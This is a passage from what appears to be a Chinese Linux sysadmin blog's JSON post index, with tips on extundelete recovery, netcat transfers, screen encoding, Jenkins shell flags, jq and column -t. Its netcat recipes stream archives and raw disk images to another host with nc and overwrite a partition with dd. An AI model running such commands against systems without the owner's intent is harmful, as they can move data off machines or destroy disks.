\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e extundelete-0.2.4  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./configure\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emake  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emake install  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch6 id=\"2卸载要恢复的分区\"\u003e2、卸载要恢复的分区\u003c/h6\u003e\n\u003cp\u003e如果你误删除的分区是/dev/sda2,那么首先需要umount 这个分区的挂载点\u003c/p\u003e\n\u003ch6 id=\"3开始恢复\"\u003e3、开始恢复\u003c/h6\u003e\n\u003cp\u003e首先df -lh查看分区的使用情况，选择一个剩余空间足够容纳要恢复的文件大小的分区，例如你的/home分区剩余100G，你需要恢复的文件小于100G，那么你可以cd /home 然后进行恢复操作\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /home  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e恢复单个文件或文件夹\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eextundelete /dev/mapper/vg_localhost-lv_home –restore-files 文件名  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e我是直接恢复整个分区\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eextundelete /dev/mapper/vg_localhost-lv_home –restore-all  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后会在当前目录生成一个恢复文件夹，进去找你要的文件就可以了\u003c/p\u003e","title":"如何通过extundelete恢复删除文件"},{"content":"一、远程传输文件压缩包\ntar zcvf - /export/A0 | nc 192.168.86.5 8732 nc -l 8732 \u0026gt; A0.tar.gz 方向倒过来也是可以的，在服务端压缩文件\ntar zcvf - /export/A0 | nc -l -p8732 nc 192.168.86.5 8732 \u0026gt; A0.tar.gz 二、远程传输整个目录\ntar cvf - /export/A0 | nc 192.168.86.5 8732 nc -l 8732 | tar xvf - 三、远程备份分区到一个文件\ndd if=/dev/sdb | gzip -c | nc 192.168.86.5 8732 nc -lp 8732 | dd of=/backup/sdb.img.gz 四、将远程分区备份文件拉到本地并恢复分区\ncat /backup/sdb.img.gz | nc 192.168.86.5 8732 nc -lp 8732 | gunzip -c | sudo dd of=/dev/sdb ","permalink":"https://rendoumi.com/posts/20240119-netcat/","summary":"\u003cp\u003e一、远程传输文件压缩包\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zcvf - /export/A0 \u003cspan class=\"p\"\u003e|\u003c/span\u003e nc 192.168.86.5 \u003cspan class=\"m\"\u003e8732\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc -l \u003cspan class=\"m\"\u003e8732\u003c/span\u003e \u0026gt; A0.tar.gz  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e方向倒过来也是可以的，在服务端压缩文件\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zcvf - /export/A0 \u003cspan class=\"p\"\u003e|\u003c/span\u003e nc -l -p8732\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc 192.168.86.5 \u003cspan class=\"m\"\u003e8732\u003c/span\u003e \u0026gt; A0.tar.gz  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e二、远程传输整个目录\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar cvf - /export/A0 \u003cspan class=\"p\"\u003e|\u003c/span\u003e nc 192.168.86.5 \u003cspan class=\"m\"\u003e8732\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc -l \u003cspan class=\"m\"\u003e8732\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e tar xvf -  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e三、远程备份分区到一个文件\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edd \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/dev/sdb \u003cspan class=\"p\"\u003e|\u003c/span\u003e gzip -c \u003cspan class=\"p\"\u003e|\u003c/span\u003e nc 192.168.86.5 \u003cspan class=\"m\"\u003e8732\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc -lp \u003cspan class=\"m\"\u003e8732\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e dd \u003cspan class=\"nv\"\u003eof\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/backup/sdb.img.gz  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e四、将远程分区备份文件拉到本地并恢复分区\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /backup/sdb.img.gz \u003cspan class=\"p\"\u003e|\u003c/span\u003e nc 192.168.86.5 \u003cspan class=\"m\"\u003e8732\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc -lp \u003cspan class=\"m\"\u003e8732\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e gunzip -c \u003cspan class=\"p\"\u003e|\u003c/span\u003e sudo dd \u003cspan class=\"nv\"\u003eof\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/dev/sdb  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"netcat的一些远程用法"},{"content":"很烦躁的问题，Terminal 终端是UTF8，显示无问题。\n可是运行 screen 后就乱码，screen 后的 env 环境跟之前一样，完全无问题\n解决方法如下：\n在自己用户的.screenrc中加两句\ndefencoding utf-8 encoding utf-8 utf-8 得把环境变量带到screen中，才行。\n","permalink":"https://rendoumi.com/posts/20240119-screen_utf/","summary":"\u003cp\u003e很烦躁的问题，Terminal 终端是UTF8，显示无问题。\u003c/p\u003e\n\u003cp\u003e可是运行 screen 后就乱码，screen 后的 env 环境跟之前一样，完全无问题\u003c/p\u003e\n\u003cp\u003e解决方法如下：\u003c/p\u003e\n\u003cp\u003e在自己用户的.screenrc中加两句\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edefencoding utf-8  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eencoding utf-8 utf-8  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e得把环境变量带到screen中，才行。\u003c/p\u003e","title":"Linux下Screen乱码"},{"content":"缺省jenkins的execute shell的方式是如下带着参数的：\nsh -xe hudsonxxx.sh 说明一下：\n-e 打开开关 表示一旦脚本中有命令的返回值为非0，则脚本立即退出，后续命令不再执行; +e 关上开关 -x 打开开关 表示执行指令后，会先显示该指令及所下的参数。 +x 关上开关 详细解释一下：\nset -e 表示一旦脚本中有命令的返回值为非0，则脚本立即退出，后续命令不再执行; set -x 表示执行指令后，会先显示该指令及所下的参数。 set -o pipefail 表示在管道连接的命令序列中，只要有任何一个命令返回非0值，则整个管道返回非0值，即使最后一个命令返回0. 注意在引用nvm以及meteor的环境中，要设置set +e 否则source nvm.sh的过程容易出错！\n","permalink":"https://rendoumi.com/posts/20240119-jenkins_shell/","summary":"\u003cp\u003e缺省jenkins的execute shell的方式是如下带着参数的：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esh -xe hudsonxxx.sh  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e说明一下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-e 打开开关 表示一旦脚本中有命令的返回值为非0，则脚本立即退出，后续命令不再执行\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e+e 关上开关\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-x 打开开关 表示执行指令后，会先显示该指令及所下的参数。\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e+x 关上开关\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e详细解释一下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eset\u003c/span\u003e -e 表示一旦脚本中有命令的返回值为非0，则脚本立即退出，后续命令不再执行\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eset\u003c/span\u003e -x 表示执行指令后，会先显示该指令及所下的参数。 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eset\u003c/span\u003e -o pipefail  表示在管道连接的命令序列中，只要有任何一个命令返回非0值，则整个管道返回非0值，即使最后一个命令返回0.  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意在引用nvm以及meteor的环境中，要设置set +e 否则source nvm.sh的过程容易出错！\u003c/p\u003e","title":"jenkins中execute shell的注意事项"},{"content":"最近调试Elasticsearch比较多，老用curl来查看数据，pretty=on固然是好，可是如果要具体看传回来的json数据，还是不方便，另外如果想在shell里处理json格式，就不知道如何是好了。就被迫改用python了，有没有在shell下调试json的工具呢？\n有，就是jq，安装so easy：\nwget http://stedolan.github.io/jq/download/linux32/jq (32-bit system) wget http://stedolan.github.io/jq/download/linux64/jq (64-bit system) chmod +x ./jq mv jq /usr/local/bin 给个json样本文件\ncat google.json { \u0026#34;name\u0026#34;: \u0026#34;Google\u0026#34;, \u0026#34;location\u0026#34;: { \u0026#34;street\u0026#34;: \u0026#34;1600 Amphitheatre Parkway\u0026#34;, \u0026#34;city\u0026#34;: \u0026#34;Mountain View\u0026#34;, \u0026#34;state\u0026#34;: \u0026#34;California\u0026#34;, \u0026#34;country\u0026#34;: \u0026#34;US\u0026#34; }, \u0026#34;employees\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Michael\u0026#34;, \u0026#34;division\u0026#34;: \u0026#34;Engineering\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;Laura\u0026#34;, \u0026#34;division\u0026#34;: \u0026#34;HR\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;Elise\u0026#34;, \u0026#34;division\u0026#34;: \u0026#34;Marketing\u0026#34; } ] } 看上面，{}括起来的是对象，如果是[]括起来的就是数组了，nodejs要注意这一点，其实json是js的Object的子集。\n获取对象：\ncat google.json | jq \u0026#39;.name\u0026#39; \u0026#34;Google\u0026#34; 获取嵌套对象：\ncat google.json | jq \u0026#39;.location.city\u0026#39; \u0026#34;Mountain View\u0026#34; 获取一个数组的值：\ncat google.json | jq \u0026#39;.employees[0].name\u0026#39; \u0026#34;Michael\u0026#34; 获取对象的多个字段：\ncat google.json | jq \u0026#39;.location | {street, city}\u0026#39; { \u0026#34;city\u0026#34;: \u0026#34;Mountain View\u0026#34;, \u0026#34;street\u0026#34;: \u0026#34;1600 Amphitheatre Parkway\u0026#34; } 很简单吧，和curl结合起来，就可以在shell进行编程处理json文件了。\ncurl和jq结合的例子：\ncurl -s ... | jq . 如果返回的是一个字符串，不想要字符串的引号，-r即可\ncurl -s ... | jq \u0026#39;.location.city\u0026#39; \u0026#34;Mountain View\u0026#34; curl -s ... | jq -r \u0026#39;.location.city\u0026#39; Mountain View 如果要计算某个数组的长度，length\ncurl -s ... | jq \u0026#39;.data | length\u0026#39; 最后放上Document：\nhttps://stedolan.github.io/jq/manual/\njq现在已经到1.7了，有很多新用法，可以计算等等，用法大全：\nhttp://hyperpolyglot.org/json\n","permalink":"https://rendoumi.com/posts/20240119-jq/","summary":"\u003cp\u003e最近调试Elasticsearch比较多，老用curl来查看数据，pretty=on固然是好，可是如果要具体看传回来的json数据，还是不方便，另外如果想在shell里处理json格式，就不知道如何是好了。就被迫改用python了，有没有在shell下调试json的工具呢？\u003c/p\u003e\n\u003cp\u003e有，就是jq，安装so easy：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget http://stedolan.github.io/jq/download/linux32/jq \u003cspan class=\"o\"\u003e(\u003c/span\u003e32-bit system\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget http://stedolan.github.io/jq/download/linux64/jq \u003cspan class=\"o\"\u003e(\u003c/span\u003e64-bit system\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod +x ./jq  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emv jq /usr/local/bin  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e给个json样本文件\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat google.json  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;name\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;Google\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;location\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"s2\"\u003e\u0026#34;street\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;1600 Amphitheatre Parkway\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"s2\"\u003e\u0026#34;city\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;Mountain View\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"s2\"\u003e\u0026#34;state\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;California\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"s2\"\u003e\u0026#34;country\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;US\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;employees\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"o\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                                \u003cspan class=\"s2\"\u003e\u0026#34;name\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;Michael\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                                \u003cspan class=\"s2\"\u003e\u0026#34;division\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;Engineering\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                                \u003cspan class=\"s2\"\u003e\u0026#34;name\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;Laura\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                                \u003cspan class=\"s2\"\u003e\u0026#34;division\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;HR\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                                \u003cspan class=\"s2\"\u003e\u0026#34;name\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;Elise\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                                \u003cspan class=\"s2\"\u003e\u0026#34;division\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;Marketing\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e看上面，{}括起来的是对象，如果是[]括起来的就是数组了，nodejs要注意这一点，其实json是js的Object的子集。\u003c/p\u003e\n\u003cp\u003e获取对象：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat google.json \u003cspan class=\"p\"\u003e|\u003c/span\u003e jq \u003cspan class=\"s1\"\u003e\u0026#39;.name\u0026#39;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Google\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e获取嵌套对象：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat google.json \u003cspan class=\"p\"\u003e|\u003c/span\u003e jq \u003cspan class=\"s1\"\u003e\u0026#39;.location.city\u0026#39;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Mountain View\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e获取一个数组的值：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat google.json \u003cspan class=\"p\"\u003e|\u003c/span\u003e jq \u003cspan class=\"s1\"\u003e\u0026#39;.employees[0].name\u0026#39;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Michael\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e获取对象的多个字段：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat google.json \u003cspan class=\"p\"\u003e|\u003c/span\u003e jq \u003cspan class=\"s1\"\u003e\u0026#39;.location | {street, city}\u0026#39;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;city\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;Mountain View\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;street\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;1600 Amphitheatre Parkway\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e很简单吧，和curl结合起来，就可以在shell进行编程处理json文件了。\u003c/p\u003e","title":"linux下如何在命令行下解析处理json文件"},{"content":"如果单独执行mount命令，显示的会很杂乱：\nmount /dev/sda3 on / type ext4 (rw) proc on /proc type proc (rw) sysfs on /sys type sysfs (rw) devpts on /dev/pts type devpts (rw,gid=5,mode=620) tmpfs on /dev/shm type tmpfs (rw) /dev/sda1 on /boot type ext4 (rw) none on /proc/sys/fs/binfmt_misc type binfmt_misc (rw) sunrpc on /var/lib/nfs/rpc_pipefs type rpc_pipefs (rw) You have mail in /var/spool/mail/root 乱作一团，那么怎么让这些显示整齐一些呢？\nmount |column -t /dev/sda3 on / type ext4 (rw) proc on /proc type proc (rw) sysfs on /sys type sysfs (rw) devpts on /dev/pts type devpts (rw,gid=5,mode=620) tmpfs on /dev/shm type tmpfs (rw) /dev/sda1 on /boot type ext4 (rw) none on /proc/sys/fs/binfmt_misc type binfmt_misc (rw) sunrpc on /var/lib/nfs/rpc_pipefs type rpc_pipefs (rw) 整齐多了，对吧。\n记住column -t这个命令，可以对输出进行对齐操作！！！\n","permalink":"https://rendoumi.com/posts/20240119-mount_beauty/","summary":"\u003cp\u003e如果单独执行mount命令，显示的会很杂乱：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emount  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/dev/sda3 on / \u003cspan class=\"nb\"\u003etype\u003c/span\u003e ext4 \u003cspan class=\"o\"\u003e(\u003c/span\u003erw\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eproc on /proc \u003cspan class=\"nb\"\u003etype\u003c/span\u003e proc \u003cspan class=\"o\"\u003e(\u003c/span\u003erw\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esysfs on /sys 